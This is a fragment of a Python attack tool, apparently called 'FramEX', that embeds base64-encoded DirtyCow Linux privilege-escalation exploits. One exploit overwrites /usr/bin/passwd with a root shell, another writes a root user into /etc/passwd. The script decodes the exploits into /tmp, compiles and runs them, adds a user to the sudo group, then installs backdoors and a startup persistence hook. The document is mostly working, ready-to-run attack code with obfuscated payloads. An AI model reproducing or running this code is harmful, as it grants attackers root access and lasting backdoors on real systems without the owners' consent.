        dc2 = 'LyoKKiAodW4pY29tbWVudCBjb3JyZWN0IHBheWxvYWQgZmlyc3QgKHg4NiBvciB4NjQpIQoqIAoq\nICQgZ2NjIGNvd3Jvb3QuYyAtbyBjb3dyb290IC1wdGhyZWFkCiogJCAuL2Nvd3Jvb3QKKiBEaXJ0\neUNvdyByb290IHByaXZpbGVnZSBlc2NhbGF0aW9uCiogQmFja2luZyB1cCAvdXNyL2Jpbi9wYXNz\nd2QuLiB0byAvdG1wL2JhawoqIFNpemUgb2YgYmluYXJ5OiA1NzA0OAoqIFJhY2luZywgdGhpcyBt\nYXkgdGFrZSBhIHdoaWxlLi4KKiAvdXNyL2Jpbi9wYXNzd2Qgb3ZlcndyaXR0ZW4KKiBQb3BwaW5n\nIHJvb3Qgc2hlbGwuCiogRG9uJ3QgZm9yZ2V0IHRvIHJlc3RvcmUgL3RtcC9iYWsKKiB0aHJlYWQg\nc3RvcHBlZAoqIHRocmVhZCBzdG9wcGVkCiogcm9vdEBib3g6L3Jvb3QvY293IyBpZAoqIHVpZD0w\nKHJvb3QpIGdpZD0xMDAwKGZvbykgZ3JvdXBzPTEwMDAoZm9vKQoqCiogQHJvYmludmVydG9uIAoq\nLwoKI2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPHN5cy9t\nbWFuLmg+CiNpbmNsdWRlIDxmY250bC5oPgojaW5jbHVkZSA8cHRocmVhZC5oPgojaW5jbHVkZSA8\nc3RyaW5nLmg+CiNpbmNsdWRlIDx1bmlzdGQuaD4KCnZvaWQgKm1hcDsKaW50IGY7CmludCBzdG9w\nID0gMDsKc3RydWN0IHN0YXQgc3Q7CmNoYXIgKm5hbWU7CnB0aHJlYWRfdCBwdGgxLHB0aDIscHRo\nMzsKCi8vIGNoYW5nZSBpZiBubyBwZXJtaXNzaW9ucyB0byByZWFkCmNoYXIgc3VpZF9iaW5hcnlb\nXSA9ICIvdXNyL2Jpbi9wYXNzd2QiOwoKLyoKKiAkIG1zZnZlbm9tIC1wIGxpbnV4L3g2NC9leGVj\nIENNRD0vYmluL2Jhc2ggUHJlcGVuZFNldHVpZD1UcnVlIC1mIGVsZiB8IHh4ZCAtaQoqLyAKdW5z\naWduZWQgY2hhciBzY1tdID0gewogIDB4N2YsIDB4NDUsIDB4NGMsIDB4NDYsIDB4MDIsIDB4MDEs\nIDB4MDEsIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsCiAgMHgwMCwgMHgwMCwgMHgwMCwg\nMHgwMCwgMHgwMiwgMHgwMCwgMHgzZSwgMHgwMCwgMHgwMSwgMHgwMCwgMHgwMCwgMHgwMCwKICAw\neDc4LCAweDAwLCAweDQwLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDQwLCAweDAw\nLCAweDAwLCAweDAwLAogIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAs\nIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsCiAgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwg\nMHg0MCwgMHgwMCwgMHgzOCwgMHgwMCwgMHgwMSwgMHgwMCwgMHgwMCwgMHgwMCwKICAweDAwLCAw\neDAwLCAweDAwLCAweDAwLCAweDAxLCAweDAwLCAweDAwLCAweDAwLCAweDA3LCAweDAwLCAweDAw\nLCAweDAwLAogIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAs\nIDB4MDAsIDB4MDAsIDB4NDAsIDB4MDAsCiAgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwg\nMHgwMCwgMHg0MCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwKICAweGIxLCAweDAwLCAw\neDAwLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweGVhLCAweDAwLCAweDAwLCAweDAw\nLAogIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsIDB4MTAsIDB4MDAsIDB4MDAsIDB4MDAs\nIDB4MDAsIDB4MDAsIDB4MDAsCiAgMHg0OCwgMHgzMSwgMHhmZiwgMHg2YSwgMHg2OSwgMHg1OCwg\nMHgwZiwgMHgwNSwgMHg2YSwgMHgzYiwgMHg1OCwgMHg5OSwKICAweDQ4LCAweGJiLCAweDJmLCAw\neDYyLCAweDY5LCAweDZlLCAweDJmLCAweDczLCAweDY4LCAweDAwLCAweDUzLCAweDQ4LAogIDB4\nODksIDB4ZTcsIDB4NjgsIDB4MmQsIDB4NjMsIDB4MDAsIDB4MDAsIDB4NDgsIDB4ODksIDB4ZTYs\nIDB4NTIsIDB4ZTgsCiAgMHgwYSwgMHgwMCwgMHgwMCwgMHgwMCwgMHgyZiwgMHg2MiwgMHg2OSwg\nMHg2ZSwgMHgyZiwgMHg2MiwgMHg2MSwgMHg3MywKICAweDY4LCAweDAwLCAweDU2LCAweDU3LCAw\neDQ4LCAweDg5LCAweGU2LCAweDBmLCAweDA1Cn07CnVuc2lnbmVkIGludCBzY19sZW4gPSAxNzc7\nCgovKgoqICQgbXNmdmVub20gLXAgbGludXgveDg2L2V4ZWMgQ01EPS9iaW4vYmFzaCBQcmVwZW5k\nU2V0dWlkPVRydWUgLWYgZWxmIHwgeHhkIC1pCnVuc2lnbmVkIGNoYXIgc2NbXSA9IHsKICAweDdm\nLCAweDQ1LCAweDRjLCAweDQ2LCAweDAxLCAweDAxLCAweDAxLCAweDAwLCAweDAwLCAweDAwLCAw\neDAwLCAweDAwLAogIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDIsIDB4MDAsIDB4MDMsIDB4\nMDAsIDB4MDEsIDB4MDAsIDB4MDAsIDB4MDAsCiAgMHg1NCwgMHg4MCwgMHgwNCwgMHgwOCwgMHgz\nNCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwKICAweDAwLCAweDAw\nLCAweDAwLCAweDAwLCAweDM0LCAweDAwLCAweDIwLCAweDAwLCAweDAxLCAweDAwLCAweDAwLCAw\neDAwLAogIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDEsIDB4MDAsIDB4MDAsIDB4MDAsIDB4\nMDAsIDB4MDAsIDB4MDAsIDB4MDAsCiAgMHgwMCwgMHg4MCwgMHgwNCwgMHgwOCwgMHgwMCwgMHg4\nMCwgMHgwNCwgMHgwOCwgMHg4OCwgMHgwMCwgMHgwMCwgMHgwMCwKICAweGJjLCAweDAwLCAweDAw\nLCAweDAwLCAweDA3LCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDEwLCAweDAwLCAweDAwLAog\nIDB4MzEsIDB4ZGIsIDB4NmEsIDB4MTcsIDB4NTgsIDB4Y2QsIDB4ODAsIDB4NmEsIDB4MGIsIDB4\nNTgsIDB4OTksIDB4NTIsCiAgMHg2NiwgMHg2OCwgMHgyZCwgMHg2MywgMHg4OSwgMHhlNywgMHg2\nOCwgMHgyZiwgMHg3MywgMHg2OCwgMHgwMCwgMHg2OCwKICAweDJmLCAweDYyLCAweDY5LCAweDZl\nLCAweDg5LCAweGUzLCAweDUyLCAweGU4LCAweDBhLCAweDAwLCAweDAwLCAweDAwLAogIDB4MmYs\nIDB4NjIsIDB4NjksIDB4NmUsIDB4MmYsIDB4NjIsIDB4NjEsIDB4NzMsIDB4NjgsIDB4MDAsIDB4\nNTcsIDB4NTMsCiAgMHg4OSwgMHhlMSwgMHhjZCwgMHg4MAp9Owp1bnNpZ25lZCBpbnQgc2NfbGVu\nID0gMTM2OwoqLwoKdm9pZCAqbWFkdmlzZVRocmVhZCh2b2lkICphcmcpCnsKICAgIGNoYXIgKnN0\ncjsKICAgIHN0cj0oY2hhciopYXJnOwogICAgaW50IGksYz0wOwogICAgZm9yKGk9MDtpPDEwMDAw\nMDAgJiYgIXN0b3A7aSsrKSB7CiAgICAgICAgYys9bWFkdmlzZShtYXAsMTAwLE1BRFZfRE9OVE5F\nRUQpOwogICAgfQogICAgcHJpbnRmKCJ0aHJlYWQgc3RvcHBlZFxuIik7Cn0KCnZvaWQgKnByb2Nz\nZWxmbWVtVGhyZWFkKHZvaWQgKmFyZykKewogICAgY2hhciAqc3RyOwogICAgc3RyPShjaGFyKilh\ncmc7CiAgICBpbnQgZj1vcGVuKCIvcHJvYy9zZWxmL21lbSIsT19SRFdSKTsKICAgIGludCBpLGM9\nMDsKICAgIGZvcihpPTA7aTwxMDAwMDAwICYmICFzdG9wO2krKykgewogICAgICAgIGxzZWVrKGYs\nbWFwLFNFRUtfU0VUKTsKICAgICAgICBjKz13cml0ZShmLCBzdHIsIHNjX2xlbik7CiAgICB9CiAg\nICBwcmludGYoInRocmVhZCBzdG9wcGVkXG4iKTsKfQoKdm9pZCAqd2FpdEZvcldyaXRlKHZvaWQg\nKmFyZykgewogICAgY2hhciBidWZbc2NfbGVuXTsKCiAgICBmb3IoOzspIHsKICAgICAgICBGSUxF\nICpmcCA9IGZvcGVuKHN1aWRfYmluYXJ5LCAicmIiKTsKCiAgICAgICAgZnJlYWQoYnVmLCBzY19s\nZW4sIDEsIGZwKTsKCiAgICAgICAgaWYobWVtY21wKGJ1Ziwgc2MsIHNjX2xlbikgPT0gMCkgewog\nICAgICAgICAgICBwcmludGYoIiVzIG92ZXJ3cml0dGVuXG4iLCBzdWlkX2JpbmFyeSk7CiAgICAg\nICAgICAgIGJyZWFrOwogICAgICAgIH0KCiAgICAgICAgZmNsb3NlKGZwKTsKICAgICAgICBzbGVl\ncCgxKTsKICAgIH0KCiAgICBzdG9wID0gMTsKCiAgICBwcmludGYoIlBvcHBpbmcgcm9vdCBzaGVs\nbC5cbiIpOwogICAgcHJpbnRmKCJEb24ndCBmb3JnZXQgdG8gcmVzdG9yZSAvdG1wL2Jha1xuIik7\nCgogICAgc3lzdGVtKHN1aWRfYmluYXJ5KTsKfQoKaW50IG1haW4oaW50IGFyZ2MsY2hhciAqYXJn\ndltdKSB7CiAgICBjaGFyICpiYWNrdXA7CgogICAgcHJpbnRmKCJEaXJ0eUNvdyByb290IHByaXZp\nbGVnZSBlc2NhbGF0aW9uXG4iKTsKICAgIHByaW50ZigiQmFja2luZyB1cCAlcyB0byAvdG1wL2Jh\na1xuIiwgc3VpZF9iaW5hcnkpOwoKICAgIGFzcHJpbnRmKCZiYWNrdXAsICJjcCAlcyAvdG1wL2Jh\nayIsIHN1aWRfYmluYXJ5KTsKICAgIHN5c3RlbShiYWNrdXApOwoKICAgIGYgPSBvcGVuKHN1aWRf\nYmluYXJ5LE9fUkRPTkxZKTsKICAgIGZzdGF0KGYsJnN0KTsKCiAgICBwcmludGYoIlNpemUgb2Yg\nYmluYXJ5OiAlZFxuIiwgc3Quc3Rfc2l6ZSk7CgogICAgY2hhciBwYXlsb2FkW3N0LnN0X3NpemVd\nOwogICAgbWVtc2V0KHBheWxvYWQsIDB4OTAsIHN0LnN0X3NpemUpOwogICAgbWVtY3B5KHBheWxv\nYWQsIHNjLCBzY19sZW4rMSk7CgogICAgbWFwID0gbW1hcChOVUxMLHN0LnN0X3NpemUsUFJPVF9S\nRUFELE1BUF9QUklWQVRFLGYsMCk7CgogICAgcHJpbnRmKCJSYWNpbmcsIHRoaXMgbWF5IHRha2Ug\nYSB3aGlsZS4uXG4iKTsKCiAgICBwdGhyZWFkX2NyZWF0ZSgmcHRoMSwgTlVMTCwgJm1hZHZpc2VU\naHJlYWQsIHN1aWRfYmluYXJ5KTsKICAgIHB0aHJlYWRfY3JlYXRlKCZwdGgyLCBOVUxMLCAmcHJv\nY3NlbGZtZW1UaHJlYWQsIHBheWxvYWQpOwogICAgcHRocmVhZF9jcmVhdGUoJnB0aDMsIE5VTEws\nICZ3YWl0Rm9yV3JpdGUsIE5VTEwpOwoKICAgIHB0aHJlYWRfam9pbihwdGgzLCBOVUxMKTsKCiAg\nICByZXR1cm4gMDsKfQoK\n'
        self.exps['dc2'] = [dc2, self.defaultConfigCompile]
        self.exs.append('dc2')    
        dc3 = 'Ly8NCi8vIFRoaXMgZXhwbG9pdCB1c2VzIHRoZSBwb2tlbW9uIGV4cGxvaXQgb2YgdGhlIGRpcnR5\nY293IHZ1bG5lcmFiaWxpdHkNCi8vIGFzIGEgYmFzZSBhbmQgYXV0b21hdGljYWxseSBnZW5lcmF0\nZXMgYSBuZXcgcGFzc3dkIGxpbmUuDQovLyBUaGUgdXNlciB3aWxsIGJlIHByb21wdGVkIGZvciB0\naGUgbmV3IHBhc3N3b3JkIHdoZW4gdGhlIGJpbmFyeSBpcyBydW4uDQovLyBUaGUgb3JpZ2luYWwg\nL2V0Yy9wYXNzd2QgZmlsZSBpcyB0aGVuIGJhY2tlZCB1cCB0byAvdG1wL3Bhc3N3ZC5iYWsNCi8v\nIGFuZCBvdmVyd3JpdGVzIHRoZSByb290IGFjY291bnQgd2l0aCB0aGUgZ2VuZXJhdGVkIGxpbmUu\nDQovLyBBZnRlciBydW5uaW5nIHRoZSBleHBsb2l0IHlvdSBzaG91bGQgYmUgYWJsZSB0byBsb2dp\nbiB3aXRoIHRoZSBuZXdseQ0KLy8gY3JlYXRlZCB1c2VyLg0KLy8NCi8vIFRvIHVzZSB0aGlzIGV4\ncGxvaXQgbW9kaWZ5IHRoZSB1c2VyIHZhbHVlcyBhY2NvcmRpbmcgdG8geW91ciBuZWVkcy4NCi8v\nICAgVGhlIGRlZmF1bHQgaXMgImZpcmVmYXJ0Ii4NCi8vDQovLyBPcmlnaW5hbCBleHBsb2l0IChk\naXJ0eWNvdydzIHB0cmFjZV9wb2tlZGF0YSAicG9rZW1vbiIgbWV0aG9kKToNCi8vICAgaHR0cHM6\nLy9naXRodWIuY29tL2RpcnR5Y293L2RpcnR5Y293LmdpdGh1Yi5pby9ibG9iL21hc3Rlci9wb2tl\nbW9uLmMNCi8vDQovLyBDb21waWxlIHdpdGg6DQovLyAgIGdjYyAtcHRocmVhZCBkaXJ0eS5jIC1v\nIGRpcnR5IC1sY3J5cHQNCi8vDQovLyBUaGVuIHJ1biB0aGUgbmV3bHkgY3JlYXRlIGJpbmFyeSBi\neSBlaXRoZXIgZG9pbmc6DQovLyAgICIuL2RpcnR5IiBvciAiLi9kaXJ0eSBteS1uZXctcGFzc3dv\ncmQiDQovLw0KLy8gQWZ0ZXJ3YXJkcywgeW91IGNhbiBlaXRoZXIgInN1IGZpcmVmYXJ0IiBvciAi\nc3NoIGZpcmVmYXJ0QC4uLiINCi8vDQovLyBET04nVCBGT1JHRVQgVE8gUkVTVE9SRSBZT1VSIC9l\ndGMvcGFzc3dkIEFGVEVSIFJVTk5JTkcgVEhFIEVYUExPSVQhDQovLyAgIG12IC90bXAvcGFzc3dk\nLmJhayAvZXRjL3Bhc3N3ZA0KLy8NCi8vIEV4cGxvaXQgYWRvcHRlZCBieSBDaHJpc3RpYW4gIkZp\ncmVGYXJ0IiBNZWhsbWF1ZXINCi8vIGh0dHBzOi8vZmlyZWZhcnQuYXQNCi8vDQoNCiNpbmNsdWRl\nIDxmY250bC5oPg0KI2luY2x1ZGUgPHB0aHJlYWQuaD4NCiNpbmNsdWRlIDxzdHJpbmcuaD4NCiNp\nbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHN0ZGludC5oPg0KI2luY2x1ZGUgPHN5cy9tbWFu\nLmg+DQojaW5jbHVkZSA8c3lzL3R5cGVzLmg+DQojaW5jbHVkZSA8c3lzL3N0YXQuaD4NCiNpbmNs\ndWRlIDxzeXMvd2FpdC5oPg0KI2luY2x1ZGUgPHN5cy9wdHJhY2UuaD4NCiNpbmNsdWRlIDxzdGRs\naWIuaD4NCiNpbmNsdWRlIDx1bmlzdGQuaD4NCiNpbmNsdWRlIDxjcnlwdC5oPg0KDQpjb25zdCBj\naGFyICpmaWxlbmFtZSA9ICIvZXRjL3Bhc3N3ZCI7DQpjb25zdCBjaGFyICpiYWNrdXBfZmlsZW5h\nbWUgPSAiL3RtcC9wYXNzd2QyLmJhayI7DQpjb25zdCBjaGFyICpzYWx0ID0gImZpcmVmYXJ0IjsN\nCg0KaW50IGY7DQp2b2lkICptYXA7DQpwaWRfdCBwaWQ7DQpwdGhyZWFkX3QgcHRoOw0Kc3RydWN0\nIHN0YXQgc3Q7DQoNCnN0cnVjdCBVc2VyaW5mbyB7DQogICBjaGFyICp1c2VybmFtZTsNCiAgIGNo\nYXIgKmhhc2g7DQogICBpbnQgdXNlcl9pZDsNCiAgIGludCBncm91cF9pZDsNCiAgIGNoYXIgKmlu\nZm87DQogICBjaGFyICpob21lX2RpcjsNCiAgIGNoYXIgKnNoZWxsOw0KfTsNCg0KY2hhciAqZ2Vu\nZXJhdGVfcGFzc3dvcmRfaGFzaChjaGFyICpwbGFpbnRleHRfcHcpIHsNCiAgcmV0dXJuIGNyeXB0\nKHBsYWludGV4dF9wdywgc2FsdCk7DQp9DQoNCmNoYXIgKmdlbmVyYXRlX3Bhc3N3ZF9saW5lKHN0\ncnVjdCBVc2VyaW5mbyB1KSB7DQogIGNvbnN0IGNoYXIgKmZvcm1hdCA9ICIlczolczolZDolZDol\nczolczolc1xuIjsNCiAgaW50IHNpemUgPSBzbnByaW50ZihOVUxMLCAwLCBmb3JtYXQsIHUudXNl\ncm5hbWUsIHUuaGFzaCwNCiAgICB1LnVzZXJfaWQsIHUuZ3JvdXBfaWQsIHUuaW5mbywgdS5ob21l\nX2RpciwgdS5zaGVsbCk7DQogIGNoYXIgKnJldCA9IG1hbGxvYyhzaXplICsgMSk7DQogIHNwcmlu\ndGYocmV0LCBmb3JtYXQsIHUudXNlcm5hbWUsIHUuaGFzaCwgdS51c2VyX2lkLA0KICAgIHUuZ3Jv\ndXBfaWQsIHUuaW5mbywgdS5ob21lX2RpciwgdS5zaGVsbCk7DQogIHJldHVybiByZXQ7DQp9DQoN\nCnZvaWQgKm1hZHZpc2VUaHJlYWQodm9pZCAqYXJnKSB7DQogIGludCBpLCBjID0gMDsNCiAgZm9y\nKGkgPSAwOyBpIDwgMjAwMDAwMDAwOyBpKyspIHsNCiAgICBjICs9IG1hZHZpc2UobWFwLCAxMDAs\nIE1BRFZfRE9OVE5FRUQpOw0KICB9DQogIHByaW50ZigibWFkdmlzZSAlZFxuXG4iLCBjKTsNCn0N\nCg0KaW50IGNvcHlfZmlsZShjb25zdCBjaGFyICpmcm9tLCBjb25zdCBjaGFyICp0bykgew0KICAv\nLyBjaGVjayBpZiB0YXJnZXQgZmlsZSBhbHJlYWR5IGV4aXN0cw0KICBpZihhY2Nlc3ModG8sIEZf\nT0spICE9IC0xKSB7DQogICAgcHJpbnRmKCJGaWxlICVzIGFscmVhZHkgZXhpc3RzISBQbGVhc2Ug\nZGVsZXRlIGl0IGFuZCBydW4gYWdhaW5cbiIsDQogICAgICB0byk7DQogICAgcmV0dXJuIC0xOw0K\nICB9DQoNCiAgY2hhciBjaDsNCiAgRklMRSAqc291cmNlLCAqdGFyZ2V0Ow0KDQogIHNvdXJjZSA9\nIGZvcGVuKGZyb20sICJyIik7DQogIGlmKHNvdXJjZSA9PSBOVUxMKSB7DQogICAgcmV0dXJuIC0x\nOw0KICB9DQogIHRhcmdldCA9IGZvcGVuKHRvLCAidyIpOw0KICBpZih0YXJnZXQgPT0gTlVMTCkg\new0KICAgICBmY2xvc2Uoc291cmNlKTsNCiAgICAgcmV0dXJuIC0xOw0KICB9DQoNCiAgd2hpbGUo\nKGNoID0gZmdldGMoc291cmNlKSkgIT0gRU9GKSB7DQogICAgIGZwdXRjKGNoLCB0YXJnZXQpOw0K\nICAgfQ0KDQogIHByaW50ZigiJXMgc3VjY2Vzc2Z1bGx5IGJhY2tlZCB1cCB0byAlc1xuIiwNCiAg\nICBmcm9tLCB0byk7DQoNCiAgZmNsb3NlKHNvdXJjZSk7DQogIGZjbG9zZSh0YXJnZXQpOw0KDQog\nIHJldHVybiAwOw0KfQ0KDQppbnQgbWFpbihpbnQgYXJnYywgY2hhciAqYXJndltdKQ0Kew0KICAv\nLyBiYWNrdXAgZmlsZQ0KICBpbnQgcmV0ID0gY29weV9maWxlKGZpbGVuYW1lLCBiYWNrdXBfZmls\nZW5hbWUpOw0KICBpZiAocmV0ICE9IDApIHsNCiAgICBleGl0KHJldCk7DQogIH0NCg0KICBzdHJ1\nY3QgVXNlcmluZm8gdXNlcjsNCiAgLy8gc2V0IHZhbHVlcywgY2hhbmdlIGFzIG5lZWRlZA0KICB1\nc2VyLnVzZXJuYW1lID0gImZpcmVmYXJ0IjsNCiAgdXNlci51c2VyX2lkID0gMDsNCiAgdXNlci5n\ncm91cF9pZCA9IDA7DQogIHVzZXIuaW5mbyA9ICJwd25lZCI7DQogIHVzZXIuaG9tZV9kaXIgPSAi\nL3Jvb3QiOw0KICB1c2VyLnNoZWxsID0gIi9iaW4vYmFzaCI7DQoNCiAgY2hhciAqcGxhaW50ZXh0\nX3B3Ow0KDQogIGlmIChhcmdjID49IDIpIHsNCiAgICBwbGFpbnRleHRfcHcgPSBhcmd2WzFdOw0K\nICAgIHByaW50ZigiUGxlYXNlIGVudGVyIHRoZSBuZXcgcGFzc3dvcmQ6ICVzXG4iLCBwbGFpbnRl\neHRfcHcpOw0KICB9IGVsc2Ugew0KICAgIHBsYWludGV4dF9wdyA9IGdldHBhc3MoIlBsZWFzZSBl\nbnRlciB0aGUgbmV3IHBhc3N3b3JkOiAiKTsNCiAgfQ0KDQogIHVzZXIuaGFzaCA9IGdlbmVyYXRl\nX3Bhc3N3b3JkX2hhc2gocGxhaW50ZXh0X3B3KTsNCiAgY2hhciAqY29tcGxldGVfcGFzc3dkX2xp\nbmUgPSBnZW5lcmF0ZV9wYXNzd2RfbGluZSh1c2VyKTsNCiAgcHJpbnRmKCJDb21wbGV0ZSBsaW5l\nOlxuJXNcbiIsIGNvbXBsZXRlX3Bhc3N3ZF9saW5lKTsNCg0KICBmID0gb3BlbihmaWxlbmFtZSwg\nT19SRE9OTFkpOw0KICBmc3RhdChmLCAmc3QpOw0KICBtYXAgPSBtbWFwKE5VTEwsDQogICAgICAg\nICAgICAgc3Quc3Rfc2l6ZSArIHNpemVvZihsb25nKSwNCiAgICAgICAgICAgICBQUk9UX1JFQUQs\nDQogICAgICAgICAgICAgTUFQX1BSSVZBVEUsDQogICAgICAgICAgICAgZiwNCiAgICAgICAgICAg\nICAwKTsNCiAgcHJpbnRmKCJtbWFwOiAlbHhcbiIsKHVuc2lnbmVkIGxvbmcpbWFwKTsNCiAgcGlk\nID0gZm9yaygpOw0KICBpZihwaWQpIHsNCiAgICB3YWl0cGlkKHBpZCwgTlVMTCwgMCk7DQogICAg\naW50IHUsIGksIG8sIGMgPSAwOw0KICAgIGludCBsPXN0cmxlbihjb21wbGV0ZV9wYXNzd2RfbGlu\nZSk7DQogICAgZm9yKGkgPSAwOyBpIDwgMTAwMDAvbDsgaSsrKSB7DQogICAgICBmb3IobyA9IDA7\nIG8gPCBsOyBvKyspIHsNCiAgICAgICAgZm9yKHUgPSAwOyB1IDwgMTAwMDA7IHUrKykgew0KICAg\nICAgICAgIGMgKz0gcHRyYWNlKFBUUkFDRV9QT0tFVEVYVCwNCiAgICAgICAgICAgICAgICAgICAg\nICBwaWQsDQogICAgICAgICAgICAgICAgICAgICAgbWFwICsgbywNCiAgICAgICAgICAgICAgICAg\nICAgICAqKChsb25nKikoY29tcGxldGVfcGFzc3dkX2xpbmUgKyBvKSkpOw0KICAgICAgICB9DQog\nICAgICB9DQogICAgfQ0KICAgIHByaW50ZigicHRyYWNlICVkXG4iLGMpOw0KICB9DQogIGVsc2Ug\new0KICAgIHB0aHJlYWRfY3JlYXRlKCZwdGgsDQogICAgICAgICAgICAgICAgICAgTlVMTCwNCiAg\nICAgICAgICAgICAgICAgICBtYWR2aXNlVGhyZWFkLA0KICAgICAgICAgICAgICAgICAgIE5VTEwp\nOw0KICAgIHB0cmFjZShQVFJBQ0VfVFJBQ0VNRSk7DQogICAga2lsbChnZXRwaWQoKSwgU0lHU1RP\nUCk7DQogICAgcHRocmVhZF9qb2luKHB0aCxOVUxMKTsNCiAgfQ0KDQogIHByaW50ZigiRG9uZSEg\nQ2hlY2sgJXMgdG8gc2VlIGlmIHRoZSBuZXcgdXNlciB3YXMgY3JlYXRlZC5cbiIsIGZpbGVuYW1l\nKTsNCiAgcHJpbnRmKCJZb3UgY2FuIGxvZyBpbiB3aXRoIHRoZSB1c2VybmFtZSAnJXMnIGFuZCB0\naGUgcGFzc3dvcmQgJyVzJy5cblxuIiwNCiAgICB1c2VyLnVzZXJuYW1lLCBwbGFpbnRleHRfcHcp\nOw0KICAgIHByaW50ZigiXG5ET04nVCBGT1JHRVQgVE8gUkVTVE9SRSEgJCBtdiAlcyAlc1xuIiwN\nCiAgICBiYWNrdXBfZmlsZW5hbWUsIGZpbGVuYW1lKTsNCiAgcmV0dXJuIDA7DQp9DQo=\n'
        self.exps['dc3'] = [dc3, self.defaultConfigCompile]
        self.exs.append('dc3')    
        return 
    def defaultConfigCompile(self, fname, arg = ""):
        return os.system("gcc -pthread -lcrypt /tmp/"+fname+".c -o /tmp/"+fname+"\nchmod +x /tmp/"+fname+"\ncd /tmp/\n./"+fname+" "+arg)
    def dc0Compile(self, fname, arg = ""):
        return os.system("gcc -pthread /tmp/"+fname+".c -o /tmp/"+fname+"\ncd /tmp\nchmod +x "+fname+"\n./"+fname+" "+arg+"\ncp /tmp/bak /etc/passwd\nusermod -aG sudo matlab\n")
    def loadExploit(self, filename, compileConfig = None):
        f = open(filename, "rb")
        s = f.read()
        f.close()
        self.exs = s
        if compileConfig is not None:
            self.exps[filename[:len(filename)-2]] = [s, compileConfig]
        else:
            self.exps[filename[:len(filename)-2]] = [s, self.defaultConfigCompile]
        return s
    def executeExploit(self, name = None, arg = ""):
        if name is not None:
            print("\nTrying Exp : " + name)
            ss = self.exps[name]
            s = ss[0]
            fn = ''.join([list(string.ascii_lowercase)[int(i)] for i in list(str(random.SystemRandom().randint(0x1, 0xffffffffff)))])
            f = open("/tmp/" + fn + ".c", 'wb')
            f.write(s.decode("base64"))
            f.close()
            ss[1](fn)
        else:
            if self.exs is not None:
                print("\nTrying Default Exp : dc0")
                ss = self.exps[self.exs[0]]
                s = ss[0]
                fn = ''.join([list(string.ascii_lowercase)[int(i)] for i in list(str(random.SystemRandom().randint(0x1, 0xffffffffff)))])
                f = open("/tmp/" + fn + ".c", 'wb')
                f.write(s.decode("base64"))
                f.close()
                ss[1](fn)
            else:
                return -1



print("\nWelcome to FramEX v1.0, Lets get Hackin...SSHhhhhh!...\n")

g = ExploitLoader()
g.executeExploit()
s = GetShell();
s.defaultBackdoors()
s.set_onStartup();

